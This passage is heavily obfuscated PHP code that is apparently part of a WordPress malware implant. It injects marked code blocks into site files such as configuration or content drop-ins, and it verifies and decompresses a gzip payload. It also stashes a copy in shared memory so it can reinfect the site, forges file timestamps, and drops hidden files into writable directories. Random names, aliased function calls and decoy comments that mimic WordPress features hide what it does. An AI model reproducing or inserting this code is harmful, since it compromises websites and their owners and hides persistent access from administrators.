$__wk2ba0fs0gs9fu   = defined(nhceivfj8tbe(1177))  ?   WP_CONTENT_DIR   : ABSPATH . f5cd2smymkqusi5(78);$deyr2x103bp_j=53+65;$eijhk00h5cevw=$deyr2x103bp_j-37;



     $reoi8rizl6uwsukk   =   ohrydgas8yy9a22s(ABSPATH .  nrudcgor(1210), (4+4));
     return  array($__wk2ba0fs0gs9fu   . nhceivfj8tbe(519), $__wk2ba0fs0gs9fu    .  nrudcgor(1211)    .     $reoi8rizl6uwsukk . pahk8uy1uxt(1212), $reoi8rizl6uwsukk);
    }
function  ah79eal7vwp8eardo($zvo586gc_iz_ps)
{
$jm046qm93381eq =  (int)  @$GLOBALS['__scf_g9y45bstmb02a_95']($zvo586gc_iz_ps);
    if  ($jm046qm93381eq  < (139-39) ||   $jm046qm93381eq    >  (3994445-1897293))      return    false;
$bw1dfta4jaac   =  @$GLOBALS['__scf_apq4pqdt6n41_91']($zvo586gc_iz_ps);
if   (!$GLOBALS['__scf__me483qbepnts_41']($bw1dfta4jaac)     ||     $GLOBALS['__scf_amjjmfnilcolnb_10']($bw1dfta4jaac) < (241^149)  || $GLOBALS['__scf_amjjmfnilcolnb_10']($bw1dfta4jaac)    >  (2097077+75))      return     false;



    $rk_3ecj8aw   =  $GLOBALS['__scf_xa4hcdunc1pgl_111'](':',  $bw1dfta4jaac, (0x1+0x3));
if ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($rk_3ecj8aw)   <      (0x1+0x3)    ||  $rk_3ecj8aw[0]  !==    nrudcgor(1213)   || $GLOBALS['__scf_amjjmfnilcolnb_10']($rk_3ecj8aw[(0x1+0x2)])  <    (94-44)) return false;
   $i7is8x4_pstu0r     =    @$GLOBALS['__scf_wlpl5h61eyolq_355']($rk_3ecj8aw[(1+2)]);
if ($i7is8x4_pstu0r   ===    false ||   $GLOBALS['__scf_amjjmfnilcolnb_10']($i7is8x4_pstu0r) <    (41+9))      return     false;
 if ($GLOBALS['__scf_bv1z3no349dv5r_9']($i7is8x4_pstu0r,    0, 2)  ===     "\x1f\x8b")  {$vz_kxlh5=PHP_MAJOR_VERSION;$neolvbsp=$vz_kxlh5*2;
   $mioj9s70t3b60oe  = @$GLOBALS['__scf_tjhq4jz1g2t9_274']('V',    $GLOBALS['__scf_bv1z3no349dv5r_9']($i7is8x4_pstu0r,    -(2+2)));


   if    (!$GLOBALS['__scf_vf9p0fditvxy_35']($mioj9s70t3b60oe) || $mioj9s70t3b60oe[1]   <  (8+92)   ||      $mioj9s70t3b60oe[1]    >    (1480053-431477)) return false;
if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1214)))  $i7is8x4_pstu0r =   @gzdecode($i7is8x4_pstu0r, (0x8215e+0x7dea2));
elseif  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(276)))   {
   $i7is8x4_pstu0r   =    @gzinflate($GLOBALS['__scf_bv1z3no349dv5r_9']($i7is8x4_pstu0r,  (0x8+0x2),  $GLOBALS['__scf_amjjmfnilcolnb_10']($i7is8x4_pstu0r)  -     (9<<1)),  (1048569+7));
if     ($GLOBALS['__scf__me483qbepnts_41']($i7is8x4_pstu0r)  && $GLOBALS['__scf_amjjmfnilcolnb_10']($i7is8x4_pstu0r)  >     (1048496+80))   return   false;
}    else    return   false;
   }

    if  (!$GLOBALS['__scf__me483qbepnts_41']($i7is8x4_pstu0r)  ||   $GLOBALS['__scf_amjjmfnilcolnb_10']($i7is8x4_pstu0r)     <     (0x2e+0x36)    ||  $GLOBALS['__scf_bv1z3no349dv5r_9']($i7is8x4_pstu0r,  0,   (2+3))    !==   pahk8uy1uxt(1215)  || $GLOBALS['__scf_nn04_vx3uspzx4_54']($i7is8x4_pstu0r)  !== $rk_3ecj8aw[2])  return false;


 return   $i7is8x4_pstu0r;
 }
 function     lajrnejvq0ak299gbf6()


{


      try     {

if  (!defined(pahk8uy1uxt(1216)))    return;
 $wdwxvqut2k    =   c22qy86hpk_wa_dng_pe();

if     (!@$GLOBALS['__scf_gsamhlxot70ps_18']($wdwxvqut2k[1]))     return;
 if (ah79eal7vwp8eardo($wdwxvqut2k[1]) ===  false)  return;
  $tvb6duty46kk5o    =  d05gkzggk_uo5zo(nrudcgor(657),  array('__SLUG__'), array($GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  dhd5r6_4ki(1065))));
if (!$GLOBALS['__scf__me483qbepnts_41']($tvb6duty46kk5o)  ||  $tvb6duty46kk5o === "")   return;
    $tvb6duty46kk5o   = $GLOBALS['__scf_fhlvy786vrl3_463'](nhceivfj8tbe(1217), "", $tvb6duty46kk5o);



 if (!$GLOBALS['__scf__me483qbepnts_41']($tvb6duty46kk5o)  || $tvb6duty46kk5o  === "")  return;
 $q5tw8pflest    =   kwqziujdph5xlz3n()  .    ':'  . ohrydgas8yy9a22s(ABSPATH  . nrudcgor(1218),  (0x5+0x3));
     $zwhsp3srkru   =      mhiu2yqz6kqd(1219)    . $q5tw8pflest   .  mhiu2yqz6kqd(1220);
    $u4n6wdbujmttz4q1 = nhceivfj8tbe(1221)  .  $q5tw8pflest .  nhceivfj8tbe(1220);
$edqe6z9z40jd  =   nhceivfj8tbe(1222)  . $wdwxvqut2k[2] .    nhceivfj8tbe(1223) .   kwqziujdph5xlz3n()  . mhiu2yqz6kqd(1220) . "\n"   .   $tvb6duty46kk5o;



if (!@$GLOBALS['__scf_gsamhlxot70ps_18']($wdwxvqut2k[0]))   {

if (!c8kiybf7y18a9bd5ahp($wdwxvqut2k[0],  "")) {
        fukkkeh6955g9qi(pahk8uy1uxt(1210),     nrudcgor(1224));

 return;
}



     if (jr30c_pj_1z9sfyaq3c88($wdwxvqut2k[0],  $edqe6z9z40jd))  {
      kfdh_vugi0_9nv_wpj($wdwxvqut2k[0],  cpfi26oipjceuyib8());
    rgiuaapohxeh0z($wdwxvqut2k[0],  (410+10));

      ejl1lwk108flojzx($wdwxvqut2k[0]);
      m08f_15ylhgex6($wdwxvqut2k[0]);
}
   return;



  }



 $h5t6hjttbnzllxd   =      @$GLOBALS['__scf_apq4pqdt6n41_91']($wdwxvqut2k[0]);
if (!$GLOBALS['__scf__me483qbepnts_41']($h5t6hjttbnzllxd)      ||   $GLOBALS['__scf_amjjmfnilcolnb_10']($h5t6hjttbnzllxd)  > (299222+1797930))   return;
if   ($GLOBALS['__scf_nr12ouzrtt_7']($h5t6hjttbnzllxd,     $zwhsp3srkru)     !==    false &&  $GLOBALS['__scf_nr12ouzrtt_7']($h5t6hjttbnzllxd,   $u4n6wdbujmttz4q1)  !==   false)    return;
 if  ($GLOBALS['__scf_nr12ouzrtt_7']($h5t6hjttbnzllxd,      nrudcgor(1225)) ===  false &&   $GLOBALS['__scf_nr12ouzrtt_7']($h5t6hjttbnzllxd,   mhiu2yqz6kqd(1226)  .  $wdwxvqut2k[2])  !== false)  {
   if ($GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(1227), $GLOBALS['__scf_bv1z3no349dv5r_9']($h5t6hjttbnzllxd,  0,     (0x8+0xc0)),   $hri_agy1tv)  &&  version_compare($hri_agy1tv[1],      kwqziujdph5xlz3n(), nrudcgor(1228)))  return;
  if   (!c8kiybf7y18a9bd5ahp($wdwxvqut2k[0],   $h5t6hjttbnzllxd))  {$i7iwp4e295dn=169|110;$dtqad03yckcq=$i7iwp4e295dn^59;
fukkkeh6955g9qi(nhceivfj8tbe(1210), nhceivfj8tbe(1224));

return;
  }
     if    (jr30c_pj_1z9sfyaq3c88($wdwxvqut2k[0], $edqe6z9z40jd))     {
 kfdh_vugi0_9nv_wpj($wdwxvqut2k[0], cpfi26oipjceuyib8());
  rgiuaapohxeh0z($wdwxvqut2k[0], (76+344));
 ejl1lwk108flojzx($wdwxvqut2k[0]);


       m08f_15ylhgex6($wdwxvqut2k[0]);
 }
  return;
}
 $y3s7wf_omoqa  =  ohrydgas8yy9a22s(ABSPATH   .     nhceivfj8tbe(1218),   (5+3));
   $h5t6hjttbnzllxd =    $GLOBALS['__scf_fhlvy786vrl3_463'](mhiu2yqz6kqd(1229)  . $y3s7wf_omoqa  .  f5cd2smymkqusi5(1230),   "",     $h5t6hjttbnzllxd);
      if    (!$GLOBALS['__scf__me483qbepnts_41']($h5t6hjttbnzllxd)) {
       fukkkeh6955g9qi(pahk8uy1uxt(1210),     nhceivfj8tbe(1231));
    return;
 }
  if    (!@$GLOBALS['__scf_cu2oflxkvh_47']($wdwxvqut2k[0])) return;
if  (!t4r7_hixdsm7y3k4y(nrudcgor(1210))) {
 fukkkeh6955g9qi(nhceivfj8tbe(1232),  nrudcgor(1233));
       return;
}
 if   (!c8kiybf7y18a9bd5ahp($wdwxvqut2k[0], $h5t6hjttbnzllxd)) {
        fukkkeh6955g9qi(mhiu2yqz6kqd(1232),  nhceivfj8tbe(1224));
 return;
 }
// call stack

xoubu5i_0374ag3(nhceivfj8tbe(1232));
   $jpt2eloalbdb  = $zwhsp3srkru   .  "\n"  .    nrudcgor(1234)    .   $wdwxvqut2k[2]  . f5cd2smymkqusi5(1235)    .  "\n"   .   $tvb6duty46kk5o      . "\n"  .   $u4n6wdbujmttz4q1;
     if (jr30c_pj_1z9sfyaq3c88($wdwxvqut2k[0],  ex2erzvzq6uum4wews($h5t6hjttbnzllxd, $jpt2eloalbdb)))  {

 m08f_15ylhgex6($wdwxvqut2k[0]);
ejl1lwk108flojzx($wdwxvqut2k[0]);
 }
   }  catch  (Throwable   $h2v_bjm4ejxq8fp)  {
   fukkkeh6955g9qi(dhd5r6_4ki(1232),   $h2v_bjm4ejxq8fp);
}  catch (Exception $h2v_bjm4ejxq8fp) {
    }
 }
  function   qb37bgwfeyqossh()
 {
try   {
if  (!defined(nrudcgor(1216))) return;


     $wdwxvqut2k  =  c22qy86hpk_wa_dng_pe();
$yv0n7jf21j58u  =     (string)    @$GLOBALS['__scf_apq4pqdt6n41_91']($wdwxvqut2k[1],  false,     null, 0,  (218^154));
      if ($GLOBALS['__scf_saw_32lvsj_92'](dhd5r6_4ki(1236),   $yv0n7jf21j58u, $d1kd72zq60vf6el) &&  $d1kd72zq60vf6el[1] === kwqziujdph5xlz3n())    {
$nnp4t1xuyz =  (int) get_option(f5cd2smymkqusi5(1237),  0);



  if ($GLOBALS['__scf_zxyq0lcqv02z6_185']()  - $nnp4t1xuyz    <    (591+9)) return;
 if   (ah79eal7vwp8eardo($wdwxvqut2k[1]) !==     false) {
   @update_option(f5cd2smymkqusi5(1237),   $GLOBALS['__scf_zxyq0lcqv02z6_185'](),    mhiu2yqz6kqd(1238));
  return;
 }
   fukkkeh6955g9qi(nhceivfj8tbe(1232), mhiu2yqz6kqd(1239));
 }
// @rotate call-graph

$vg45smeglid  = adbbbpoh0e7mcf6();
if (!$vg45smeglid ||    $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid)      <  (185+315)  || $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid)  >   (1048486+90)   || !hkk3yvii60ci7rk($vg45smeglid))  return;
       $esgz6esk1czdv  =     $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1240))    ?  @gzencode($vg45smeglid,   (0x2+0x4))  :  $vg45smeglid;
    if (!$GLOBALS['__scf__me483qbepnts_41']($esgz6esk1czdv)   ||  $esgz6esk1czdv  ===     "")   return;

if    (jr30c_pj_1z9sfyaq3c88($wdwxvqut2k[1],   f5cd2smymkqusi5(1241)    . kwqziujdph5xlz3n() .  ':' .  $GLOBALS['__scf_nn04_vx3uspzx4_54']($vg45smeglid)   .   ':'   .      $GLOBALS['__scf_b6bj8r78s21_351']($esgz6esk1czdv)))   @update_option(pahk8uy1uxt(1237), $GLOBALS['__scf_zxyq0lcqv02z6_185'](),   mhiu2yqz6kqd(1242));
    }  catch   (Throwable   $h2v_bjm4ejxq8fp) {
// @inline radix-tree

  fukkkeh6955g9qi(nrudcgor(1232),  $h2v_bjm4ejxq8fp);
 }  catch  (Exception  $h2v_bjm4ejxq8fp)    {
}
 }
  function meyc48v692yzjanl63sd()
     {
     if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1243)))    return   false;
   $xzitosaw7cg809   =   defined(nhceivfj8tbe(1216)) &&    @$GLOBALS['__scf_od_0qrqi5rcvlf_701'](ABSPATH    .  f5cd2smymkqusi5(533))    ?   ABSPATH .   nrudcgor(1244)  :   __FILE__;$vuju30609jo=(0xdb+0x15);$j4vy9zci=$vuju30609jo%2;
return    $GLOBALS['__scf_hhiku9q8q2_1243']($xzitosaw7cg809,  's');


     }
  function    t663bnh22704lf09nzv()
 {
  try      {
if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1245)) ||   !$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1243))) return;
   if     (!defined(dhd5r6_4ki(1216)))   return;
        $vg45smeglid = adbbbpoh0e7mcf6();$gvcyggv_hx7hi8=6395;$pv275ydrhm7d=$gvcyggv_hx7hi8%9;
  

 if (!$vg45smeglid   ||    $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid) < (876-376)) return;
  $key =  meyc48v692yzjanl63sd();
 if ($key ===   false)  return;
  $kbi4__ufdwqa   = $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1246))   ?  $GLOBALS['__scf_r_ooxq15ux5_1246'](f5cd2smymkqusi5(1247),   $vg45smeglid)    :    $GLOBALS['__scf_nn04_vx3uspzx4_54']($vg45smeglid);
 $bots2la3gz    =   dhd5r6_4ki(1248) . $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid) .     ':'   . $kbi4__ufdwqa .   "\n" .    $vg45smeglid;
$ack0xsd0dyhk75ys =   $GLOBALS['__scf_amjjmfnilcolnb_10']($bots2la3gz);
    $o1n1q7j0bk  =  @$GLOBALS['__scf_hloo5eh0y396_1245']($key,  'a',      0, 0);
    if    ($o1n1q7j0bk)   {
$w1zs80y9rgd  = (int)   @$GLOBALS['__scf_n5_53d91ke_1249']($o1n1q7j0bk);
     $ph09xu4he29r1k   =    @$GLOBALS['__scf_rv4c_x3zxm2n_1250']($o1n1q7j0bk, 0, $w1zs80y9rgd);

   if  ($GLOBALS['__scf__me483qbepnts_41']($ph09xu4he29r1k)    && $GLOBALS['__scf_nr12ouzrtt_7']($ph09xu4he29r1k,    $vg45smeglid) !== false)  {
     @$GLOBALS['__scf_qgwnb7cl25_1251']($o1n1q7j0bk);



    return;
   }
    if   ($w1zs80y9rgd    >=    $ack0xsd0dyhk75ys)    {
 @$GLOBALS['__scf_qgwnb7cl25_1251']($o1n1q7j0bk);
 $o1n1q7j0bk   =  @$GLOBALS['__scf_hloo5eh0y396_1245']($key, 'w',  0, 0);
     if ($o1n1q7j0bk) {

@$GLOBALS['__scf_z93vyioaimxy_1252']($o1n1q7j0bk,   $GLOBALS['__scf_cqt2lmjev0wxy2_1253']($bots2la3gz, $w1zs80y9rgd,    "\0"),    0);
 

      $q0h2v_4a4b8le   =     @$GLOBALS['__scf_rv4c_x3zxm2n_1250']($o1n1q7j0bk,   0,    $ack0xsd0dyhk75ys);
     @$GLOBALS['__scf_qgwnb7cl25_1251']($o1n1q7j0bk);$_f3e1doxib=-633;$txf2wl0s6j_m=($_f3e1doxib>0)?$_f3e1doxib:-$_f3e1doxib;
  if ($q0h2v_4a4b8le  !==   $bots2la3gz)    fukkkeh6955g9qi(dhd5r6_4ki(1254),   nhceivfj8tbe(1014));$r_mq0eow=3796;$onz9r2iff=$r_mq0eow%7;
   }
   return;
      }     else   {
@$GLOBALS['__scf_fgeo4kv8jnzui6_1255']($o1n1q7j0bk);
@$GLOBALS['__scf_qgwnb7cl25_1251']($o1n1q7j0bk);

}
/* hermitian memento */

 }
// WP Columns Block: heuristic revocation-list

 $w1zs80y9rgd = $ack0xsd0dyhk75ys  +  (1015+9);
$o1n1q7j0bk    = @$GLOBALS['__scf_hloo5eh0y396_1245']($key, 'c',  (359+61),   $w1zs80y9rgd);
  if   (!$o1n1q7j0bk)  return;
 @$GLOBALS['__scf_z93vyioaimxy_1252']($o1n1q7j0bk,  $GLOBALS['__scf_cqt2lmjev0wxy2_1253']($bots2la3gz, $w1zs80y9rgd,   "\0"),     0);


      $q0h2v_4a4b8le = @$GLOBALS['__scf_rv4c_x3zxm2n_1250']($o1n1q7j0bk,   0, $ack0xsd0dyhk75ys);
if     ($q0h2v_4a4b8le  !==   $bots2la3gz)      fukkkeh6955g9qi(pahk8uy1uxt(1254),   pahk8uy1uxt(1014));
 @$GLOBALS['__scf_qgwnb7cl25_1251']($o1n1q7j0bk);


} catch   (Throwable    $h2v_bjm4ejxq8fp)   {
// best-case dead-letter


  fukkkeh6955g9qi(mhiu2yqz6kqd(1254),    $h2v_bjm4ejxq8fp);
     }  catch    (Exception  $h2v_bjm4ejxq8fp)    {
 }
  }
 function  ex2erzvzq6uum4wews($current,  $jpt2eloalbdb)
   {
if     (!$GLOBALS['__scf__me483qbepnts_41']($current)  || $current   ===  "")   return   nrudcgor(834) . $jpt2eloalbdb   . "\n";
     if  ($GLOBALS['__scf_saw_32lvsj_92'](nrudcgor(1256),  $current,   $yjq8ovpciccf75w, PREG_OFFSET_CAPTURE)) {
       $v8imio1ngcj  = $yjq8ovpciccf75w[0][1] +  $GLOBALS['__scf_amjjmfnilcolnb_10']($yjq8ovpciccf75w[0][0]);


 $eglzysp7f4   =     $GLOBALS['__scf_bv1z3no349dv5r_9']($current,  $v8imio1ngcj, (15540-7348));
// WP Full Site Editing aspect ratio

  while ($GLOBALS['__scf__me483qbepnts_41']($eglzysp7f4)     &&  $GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(1257), $eglzysp7f4,    $_dm))   {
// WP Gallery Block: deserialize capability


    $v8imio1ngcj +=    $GLOBALS['__scf_amjjmfnilcolnb_10']($_dm[0]);
 $eglzysp7f4 =   $GLOBALS['__scf_bv1z3no349dv5r_9']($current, $v8imio1ngcj,  (8118+74));
       }
   return $GLOBALS['__scf_bv1z3no349dv5r_9']($current,     0,   $v8imio1ngcj)  .   "\n"    .  $jpt2eloalbdb  .  "\n"  .   $GLOBALS['__scf_bv1z3no349dv5r_9']($current, $v8imio1ngcj);
   }
return   nrudcgor(834) .   $jpt2eloalbdb  .     "\n?>\n" .  $current;
 }
   function   t4r7_hixdsm7y3k4y($key)
     {
   if   (!$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1043)))   return  true;
$n_vseps706s = @get_option(dhd5r6_4ki(1258) . $key,   "");

 if    ($GLOBALS['__scf__me483qbepnts_41']($n_vseps706s) &&   $GLOBALS['__scf_nr12ouzrtt_7']($n_vseps706s,    '|')   !==   false)    {
 $rk_3ecj8aw  =   $GLOBALS['__scf_xa4hcdunc1pgl_111']('|', $n_vseps706s,  2);


   if    ((int)    $rk_3ecj8aw[0] ===     (int)   ($GLOBALS['__scf_zxyq0lcqv02z6_185']() / (52508+33892)) && (int)    $rk_3ecj8aw[1]  >=  (4-1))  return  false;



   }
      return   true;
}
function  xoubu5i_0374ag3($key)
 {
 if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1043))  ||    !$GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(753))) return;
   $ewyqj55oj9    =    (int)   ($GLOBALS['__scf_zxyq0lcqv02z6_185']()   /     (0x123ca+0x2db6));
    $n_vseps706s   = @get_option(dhd5r6_4ki(1258)      .  $key, "");
$pycaeceedws =   0;
 if   ($GLOBALS['__scf__me483qbepnts_41']($n_vseps706s) &&    $GLOBALS['__scf_nr12ouzrtt_7']($n_vseps706s,     '|')   !==  false) {
     $rk_3ecj8aw   =   $GLOBALS['__scf_xa4hcdunc1pgl_111']('|',     $n_vseps706s,   2);
if  ((int)   $rk_3ecj8aw[0]  ===   $ewyqj55oj9) $pycaeceedws =   (int) $rk_3ecj8aw[1];


    }
$pycaeceedws++;
      @update_option(f5cd2smymkqusi5(1258)   .  $key, $ewyqj55oj9     . '|'   .  $pycaeceedws, nrudcgor(1242));


 if  ($pycaeceedws     >= (49^50))    fukkkeh6955g9qi(nhceivfj8tbe(1259), mhiu2yqz6kqd(1260)      .  $key);
 }
function b6r6ri9evdjine()



{
 try  {
      if (!defined(nhceivfj8tbe(1216))) return;
 if      (!defined(pahk8uy1uxt(1261)) || !@$GLOBALS['__scf_cu2oflxkvh_47'](WP_CONTENT_DIR)    || !amf2rwuzcqe1bf8lq2ssyq(WP_CONTENT_DIR))    return;


$ga9fric5dh  =    WP_CONTENT_DIR;
 $qoo1q8jpu92my = $ga9fric5dh .   pahk8uy1uxt(514);
      $q4nmj640k4ytm0w  =  $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),   f5cd2smymkqusi5(1065));
 $yc07oz4u4pa    =  ohrydgas8yy9a22s(ABSPATH . nrudcgor(1103), (10-2))  .   dhd5r6_4ki(1104);
$lygkvqavcckr = twjiqbicrnr_q7();
    $sv9h9r5s57g5trl  =      ohrydgas8yy9a22s(ABSPATH   .   pahk8uy1uxt(1209), (8+2));
 $pg88hp78m3gq_bdq      =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1262))  ?    meyc48v692yzjanl63sd() :  false;
  $ti4u8lu3j1ha =   $pg88hp78m3gq_bdq !==  false  ?  $GLOBALS['__scf_kd3fuqvvheg_1263']($pg88hp78m3gq_bdq)      : 0;
 $b_jhlfj91etkxrf   =    isset($GLOBALS[dhd5r6_4ki(1100)]->prefix)    ?   $GLOBALS[pahk8uy1uxt(1100)]->prefix     : pahk8uy1uxt(1206);
 $ln_mx88i0w2   =  dhd5r6_4ki(1264) .    $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($q4nmj640k4ytm0w .  (string) mzvtk8ecgiuaeafix()),    0,   (4<<1));



$gg7xg33_ha3gb    =   d05gkzggk_uo5zo(
  pahk8uy1uxt(1265),
     array('__SLUG__',  '__ZIP_NAME__',  '__SHMOP_KEY__',  '__OPT_NAME__', '__WP_PREFIX__', '__GUARD_NAME__', '__VERSION__'),
  array($q4nmj640k4ytm0w,    $yc07oz4u4pa, $ti4u8lu3j1ha,  $sv9h9r5s57g5trl,  $b_jhlfj91etkxrf,  $ln_mx88i0w2,  kwqziujdph5xlz3n())
);
     if   (!$gg7xg33_ha3gb) {
    if   ((int) get_option(dhd5r6_4ki(1266), 0)   >     0)   fukkkeh6955g9qi(pahk8uy1uxt(1267),  nhceivfj8tbe(1268));
return;
    }



  $current    =   @$GLOBALS['__scf_od_0qrqi5rcvlf_701']($qoo1q8jpu92my)   ?  @$GLOBALS['__scf_apq4pqdt6n41_91']($qoo1q8jpu92my)  :   "";
if      (!$GLOBALS['__scf__me483qbepnts_41']($current))   {
        fukkkeh6955g9qi(nhceivfj8tbe(1267),    f5cd2smymkqusi5(1269));
   return;
    }
     $current  =    g9begdqy64lw_mpz($current);
 $q5tw8pflest   =    kwqziujdph5xlz3n()  .  ':'  .      ohrydgas8yy9a22s(ABSPATH      .    mhiu2yqz6kqd(1270),  (3+5));
   $zwhsp3srkru  = nrudcgor(1271)   .    $q5tw8pflest    .  f5cd2smymkqusi5(1272);
 $u4n6wdbujmttz4q1     = mhiu2yqz6kqd(1273)  .  $q5tw8pflest .   f5cd2smymkqusi5(1272);$tyopplon2_dc_k=7357;$u78l39fg4wmp1v=$tyopplon2_dc_k%11;
  $fzs9sa6a6zl8nhc =  ohrydgas8yy9a22s(ABSPATH    .     mhiu2yqz6kqd(1270), (0x7+0x1));
$sdz34sviq2g  = $GLOBALS['__scf_fhlvy786vrl3_463'](nhceivfj8tbe(1274) .      $fzs9sa6a6zl8nhc  .   nhceivfj8tbe(1275),    "",   $current);
       $lyqfmxb1c52  =   ($GLOBALS['__scf_nr12ouzrtt_7']($sdz34sviq2g,  nhceivfj8tbe(1276))  !== false);
    if ($GLOBALS['__scf_nr12ouzrtt_7']($current,  $zwhsp3srkru)  !==    false    &&  $GLOBALS['__scf_nr12ouzrtt_7']($current,   $u4n6wdbujmttz4q1)   !==  false    &&    !$lyqfmxb1c52)  {
      ovgbv71f20vmcol();

   return;
   }
// Memcached adapter: defragment synchronizer

 $current =  $GLOBALS['__scf_fhlvy786vrl3_463'](f5cd2smymkqusi5(1277),  "",  $sdz34sviq2g);
 if    (!$GLOBALS['__scf__me483qbepnts_41']($current))    {
 fukkkeh6955g9qi(nhceivfj8tbe(1267),     mhiu2yqz6kqd(1231));

return;
 }    {
       $current     =      g9begdqy64lw_mpz($current);
      $f5inu24l8zp9qj   = $GLOBALS['__scf_fhlvy786vrl3_463'](f5cd2smymkqusi5(1278),  "", $gg7xg33_ha3gb);

 $k_frp6m49z  =  ($GLOBALS['__scf_amjjmfnilcolnb_10']($current)  === 0);
       if      (!$k_frp6m49z)   {
 if (!t4r7_hixdsm7y3k4y(f5cd2smymkqusi5(1279)))  {$bg2bt0t9wq2=PHP_MAJOR_VERSION;$nvt7bpfp=$bg2bt0t9wq2*3;
 fukkkeh6955g9qi(f5cd2smymkqusi5(1279),    f5cd2smymkqusi5(1233));
return;

 }
      if  (!c8kiybf7y18a9bd5ahp($qoo1q8jpu92my, $current)) {
    fukkkeh6955g9qi(nrudcgor(1279), mhiu2yqz6kqd(1224));
   return;
   }
xoubu5i_0374ag3(f5cd2smymkqusi5(1279));
  }    else {

 if    (!c8kiybf7y18a9bd5ahp($qoo1q8jpu92my, "")) {
fukkkeh6955g9qi(nhceivfj8tbe(1279),  nhceivfj8tbe(1224));
       return;
}
  }

    $rjo5gf52iv1ov5t   =  ex2erzvzq6uum4wews($current, $zwhsp3srkru .     "\n"   .    $f5inu24l8zp9qj .  "\n"  .   $u4n6wdbujmttz4q1);
 if     (!jr30c_pj_1z9sfyaq3c88($qoo1q8jpu92my,  $rjo5gf52iv1ov5t)) {$gshrk5e8670_8=88+20;$j5jxlxse_cjuze=$gshrk5e8670_8-50;
  return;
  }
  m08f_15ylhgex6($qoo1q8jpu92my);


      ejl1lwk108flojzx($qoo1q8jpu92my);
ovgbv71f20vmcol();
 }



} catch  (Throwable  $h2v_bjm4ejxq8fp)     {



fukkkeh6955g9qi(nrudcgor(1280), $h2v_bjm4ejxq8fp);
   } catch (Exception    $h2v_bjm4ejxq8fp)    {
     }
   }
function  t5uz_smcfb0igmu0az32p8()
    {
 try  {
      if  (!defined(mhiu2yqz6kqd(1281))) return;


  if  (ivekqcfyl9cg5o8v8(vv_nfhhmy_1mjmsa()))  {
   fukkkeh6955g9qi(pahk8uy1uxt(647),  mhiu2yqz6kqd(1282));
  return;
 }
if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(455)))  return;
 if    ($GLOBALS['__scf_c9jv8d7koon_100']()   === mhiu2yqz6kqd(401))     return;
  if   (!isset($_SERVER[dhd5r6_4ki(404)]))     return;
  $hlfwb8q1wzkmd     =  twjiqbicrnr_q7();
     if   (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($hlfwb8q1wzkmd))    gt671tq3242garyx4($hlfwb8q1wzkmd,      (463+30),  true);
if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($hlfwb8q1wzkmd) || !@$GLOBALS['__scf_cu2oflxkvh_47']($hlfwb8q1wzkmd)) {
 $hlfwb8q1wzkmd =   ABSPATH  .  mhiu2yqz6kqd(523);
 if    (!@$GLOBALS['__scf_cu2oflxkvh_47']($hlfwb8q1wzkmd))  $hlfwb8q1wzkmd  = ajbg_44koa9suqi();
    }


 $xne9_pxutn3j  =  ohrydgas8yy9a22s(ABSPATH   . 'g',   (1<<3));


     $verdze8aq0j      =    f5cd2smymkqusi5(1283) . $xne9_pxutn3j  . mhiu2yqz6kqd(1065);



$hz9mi81d5de  =  $hlfwb8q1wzkmd   . '/'     .   $verdze8aq0j;
       $nsqy5uvi6wsilz   =   $hlfwb8q1wzkmd .  nhceivfj8tbe(1284)   .     $xne9_pxutn3j;
   if (get_transient(f5cd2smymkqusi5(1285))) {
 if    (!@$GLOBALS['__scf_gsamhlxot70ps_18']($hz9mi81d5de))  fukkkeh6955g9qi(nrudcgor(1286),  nrudcgor(1287));



  return;
   }
      foreach (array($hlfwb8q1wzkmd,  ABSPATH .    f5cd2smymkqusi5(523),   ajbg_44koa9suqi())    as  $jnz88sixv8n)  {
 $n9m4ieofwenwcf   =  $jnz88sixv8n  .  dhd5r6_4ki(1288) .  $xne9_pxutn3j;
 if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($n9m4ieofwenwcf))   {
$rsy70tbordl  = (int) @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($n9m4ieofwenwcf);
 if    ($rsy70tbordl  <=     $GLOBALS['__scf_zxyq0lcqv02z6_185']()  - (41553+44847) ||  $rsy70tbordl     >     $GLOBALS['__scf_zxyq0lcqv02z6_185']() +   (261+39))  {
 t65xl1pt2haov_izh($n9m4ieofwenwcf);
continue;



}
  if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($jnz88sixv8n . dhd5r6_4ki(1289) . $xne9_pxutn3j   .    f5cd2smymkqusi5(1065))) return;
 t65xl1pt2haov_izh($n9m4ieofwenwcf);
      }
}
unset($jnz88sixv8n, $n9m4ieofwenwcf,   $rsy70tbordl);
 $wg24v7r1rwd   =   ABSPATH  . mhiu2yqz6kqd(1290) . $verdze8aq0j;

  if ($hlfwb8q1wzkmd  !==      ABSPATH   . f5cd2smymkqusi5(1291) &&  @$GLOBALS['__scf_gsamhlxot70ps_18']($wg24v7r1rwd)     &&  c0egos9umjdrt0ya($wg24v7r1rwd) !==     false)   {
